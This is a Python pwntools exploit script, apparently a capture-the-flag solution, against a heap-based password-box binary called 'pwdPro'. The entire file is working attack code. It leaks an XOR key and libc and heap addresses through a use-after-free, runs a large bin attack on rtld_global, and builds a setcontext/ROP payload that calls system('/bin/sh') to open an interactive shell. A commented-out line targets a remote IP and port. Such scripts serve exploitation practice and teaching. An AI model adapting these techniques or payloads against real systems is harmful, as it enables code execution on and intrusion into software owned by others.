from pwn import *
context.log_level = 'debug'
#context.terminal = ['tmux','sp','-h']


# def command(index):
#     p.sendlineafter("Choice:\n",str(index))

def add(id,size,content):
    p.sendlineafter("Input Your Choice:\n",str(1))
    p.sendlineafter("Which PwdBox You Want Add:\n",str(id))
    p.sendafter("Save:",str(id))
    p.sendlineafter("Pwd:",str(size))
    p.sendafter("Pwd:",content)
def show(id):
    p.sendlineafter("Choice:\n",str(3))
    p.sendlineafter("Check:\n",str(id))
def delete(id):
    p.sendlineafter("Choice:\n",str(4))
    p.sendlineafter("Delete:\n",str(id))
def edit(id,data):
    p.sendlineafter("Choice:\n",str(2))
    p.sendlineafter(" PwdBox You Want Edit:\n",str(id))
    p.send(str(data))
def recovery(id):
    p.sendlineafter("Choice:\n",str(5))
    p.sendlineafter("you want 2 Recover:\n",str(id))

p = process("./pwdPro")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# p=process('./pwdPro',env={'LD_PRELOAD':'./libc.so'})
#p=remote('47.104.71.220',49261)
#libc = ELF("libc.so")


# leak randnum
add(0,0x520,'\n')
p.recvuntil('D:')
leak=u64(p.recv(8))
rand=leak^0xa
print hex(rand)

# leak libc addr 
add(1,0x428,'\n') #1
add(2,0x500,'\n') #2
add(3,0x420,'\n') #3

delete(0)
add(4,0x600,'\n') #4
add(5,0x600,'\n') #5
recovery(0)
show(0)
p.recvuntil("is: ")
leak_addr = (u64(p.recv(8))^rand)-1168
log.info("leak_addr: "+hex(leak_addr))
libc_base = leak_addr - 0x1ebb80
log.info("libc_base: "+hex(libc_base))

system_addr = libc_base+libc.sym['system']
print "system:",hex(system_addr)
setcontext_61 = libc_base+libc.sym['setcontext']+61
print "setcontext_61:",hex(setcontext_61)
ret = libc_base + libc.sym['setcontext']+351
print "ret:",hex(ret)

rtl_global = libc_base + 0x23c060#(0x2E060+0x7ffff7fcf000-0x7ffff7dc1000)
log.info("rtl_global: "+hex(rtl_global))
log.info("xxxxxxxxxx: "+hex(libc_base + 0x23d738))

pop_rdi = libc_base + 0x00000000000276e9
print "pop_rdi:",hex(pop_rdi)
binsh_addr = libc_base + 0x00000000001b75aa
print "binsh_addr:",hex(binsh_addr)
ogg = libc_base + 0xe6e79

edit(0,'a'*0x10)
show(0)
p.recvuntil("Pwd is: ")
p.recv(16)
heap_addr = u64(p.recv(8, 2)) ^ rand
log.info("heap_addr: "+hex(heap_addr))
edit(0,p64(leak_addr+1168)*2)

delete(2)
delete(4)

edit(0,p64(leak_addr+1168) + p64(leak_addr+1168) + p64(0) + p64(rtl_global - 0x20))
add(11,0x600,'large bin attack!!\n')

recovery(2)

payload = p64(0) + p64(libc_base + 0x23d740) + p64(0) + p64(heap_addr + 0x960)
payload += p64(setcontext_61) + p64(ret)

payload += p64(binsh_addr)
payload += p64(0)
payload += p64(system_addr)
payload += b'\x00'*0x80

payload += p64(heap_addr + 0x960 + 0x28 + 0x18)

payload += p64(pop_rdi)
payload = payload.ljust(0x100,b'\x00')
payload += p64(heap_addr + 0x960 + 0x10 + 0x110)*0x3
payload += p64(0x10)
payload = payload.ljust(0x31C - 0x10,b'\x00')
payload += p8(0x8)
#payload = payload.ljust(0x500,b'\x00')

gdb.attach(p)
raw_input()

edit(2,payload)
edit(1,'b'*0x420 + p64(heap_addr + 0x960 + 0x20))

p.sendline("6")

p.interactive()
